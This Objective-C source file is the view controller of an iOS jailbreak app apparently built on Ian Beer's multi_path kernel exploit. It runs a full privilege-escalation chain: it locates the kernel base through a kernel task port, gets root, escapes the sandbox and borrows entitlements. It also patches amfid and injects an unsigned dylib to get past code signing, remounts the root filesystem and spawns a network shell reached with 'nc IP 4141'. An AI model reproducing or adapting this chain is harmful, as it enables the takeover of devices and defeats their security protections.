//
//  ViewController.m
//  multi_path
//
//  Created by Ian Beer on 5/28/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//

#import "ViewController.h"
#include "sploit.h"
#include "jelbrek.h"
#include "kern_utils.h"
#include "offsetof.h"
#include "patchfinder64.h"
#include "shell.h"
#include "kexecute.h"
#include "unlocknvram.h"
#include "remap_tfp_set_hsp.h"
#include "inject_criticald.h"
//#include "amfid.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>


mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;

//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000

#define ptrSize sizeof(uintptr_t)

uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;


while (1) {
    char *buf;
    mach_msg_type_number_t sz = 0;
    kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
    
    if (ret) {
        goto next;
    }
    
    if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
        int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            goto next;
        }
        
        for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
            mach_msg_type_number_t sz;
            int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
            
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                exit(-1);
            }
            if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                
                printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                
                return addr;
            }
        }
    }
    
next:
    addr -= 0x200000;
}
}


@interface ViewController ()

@end

@implementation ViewController

//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
- (NSString *)getIPAddress {
    
    NSString *address = @"Are you connected to internet?";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    // retrieve the current interfaces - returns 0 on success
    success = getifaddrs(&interfaces);
    if (success == 0) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                // Check if interface is en0 which is the wifi connection on the iPhone
                // or to usb en2
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"] ||
                    [[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en2"]) {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    
                    [self log:[NSString stringWithFormat:@"Shell should be up and running\nconnect with netcat: nc %@ 4141", address]];
                }
                
            }
            
            temp_addr = temp_addr->ifa_next;
        }
    }
    // Free memory
    freeifaddrs(interfaces);
    return address;
    
}

-(void)log:(NSString*)log {
    self.logs.text = [NSString stringWithFormat:@"%@%@\n", self.logs.text, log];
}

-(void)jelbrek {
    
    get_root(getpid()); //setuid(0)
    empower(getpid()); //csflags
    unsandbox(getpid());
    
    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
        fclose(f);
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }
    
    
    setKernelSymbol("_kernproc", find_kernproc()-kslide);
    platformizeMe();
    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
    pid_t pid = pid_for_name("sysdiagnose");
    kill(pid, SIGSTOP);
    kill(pid, SIGSTOP);
    
    extern int platformizeProcAtAddr(uint64_t addr); //WHY ISN'T THIS ON QiLin.h???
    
    pid_t amfid = pid_for_name("amfid");
    
    castrateAmfid(); //patch amfid
    
    platformizeProcAtAddr(proc_for_pid(amfid));
    entitlePid(amfid, "get-task-allow", true, "com.apple.private.skip-library-validation", true); //add required entitlements to load unsigned library
    empower(amfid);
    
    NSString *pl = [NSString stringWithFormat:@"%@/amfid_payload.dylib", [[NSBundle mainBundle] bundlePath]]; //any tweak NOT compiled with substrate works.
    int rv2 = inject_dylib(amfid, (char*)[pl UTF8String]); //properly patch amfid
    
    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([testbin UTF8String], 777); //give it proper permissions
    
    pid_t pd;
    const char* args[] = {[testbin UTF8String],  NULL};
    int rv = posix_spawn(&pd, [testbin UTF8String], NULL, NULL, (char **)&args, NULL);

    [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
    
    // Show USB and WiFi address
    NSString *ipaddr = [self getIPAddress];
    
    if (@available(iOS 11.3, *)) {
        [self log:@"Remount eta son?"];
    } else if (@available(iOS 11.0, *)) {
        remount1126();
        [self log:[NSString stringWithFormat:@"Did we mount / as read+write? %s", [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? "yes" : "no"]];
    }
    

    
/*    if (!rv) {
        pid_t sb = pid_for_name("SpringBoard"); //get SpringBoard's pid
        
        entitlePid(sb, "get-task-allow", true, "com.apple.private.skip-library-validation", true); //add required entitlements to load unsigned library
        empower(sb); //set csflags
        platformizeProcAtAddr(proc_for_pid(sb)); //why isn't SpringBoard already platform?
        
        NSString *cyc = [NSString stringWithFormat:@"%@/dylibs/dummypass.dylib", [[NSBundle mainBundle] bundlePath]]; //any tweak NOT compiled with substrate works.
        rv2 = inject_dylib(sb, (char*)[cyc UTF8String]);
    }
    */
    if (![ipaddr isEqualToString:@"Are you connected to internet?"])
        [self log:(rv2) ? @"Failed to inject code to amfid!" : @"Code injection success!"];
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    remap_tfp0_set_hsp4(&mapped_tfp0);
    [self log:[NSString stringWithFormat:@"enabled host_get_special_port_4_? %@", (mapped_tfp0 == MACH_PORT_NULL) ? @"FAIL" : @"SUCCESS"]];
    unlocknvram();
    term_kexecute();
    
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        if (!rv)
            drop_payload(); //chmod 777 all binaries and spawn a shell
    });
    
   /* NSString *dropbear = [NSString stringWithFormat:@"%@/iosbinpack64/usr/local/bin/dropbear", [[NSBundle mainBundle] bundlePath]]; //test binary
    NSString *bash = [NSString stringWithFormat:@"%@/iosbinpack64/bin/bash", [[NSBundle mainBundle] bundlePath]]; //test binary
    
    pid_t drop;
    const char* dargs[] = {[dropbear UTF8String],  "-R", "--shell", [bash UTF8String], NULL};
    rv = posix_spawn(&drop, [dropbear UTF8String], NULL, NULL, (char **)&dargs, NULL);
    
    if (!rv) [self log:@"Launched dropbear?"];*/
    
    //to connect use netcat:
    //nc YOUR_IP 4141
    //replace your IP in there
    
}
- (IBAction)go:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit success!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self jelbrek];
    }
    else
        [self log:@"Exploit failed!"];
}

- (void)viewDidLoad {
  [super viewDidLoad];
  // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
  [super didReceiveMemoryWarning];
  // Dispose of any resources that can be recreated.
}


@end
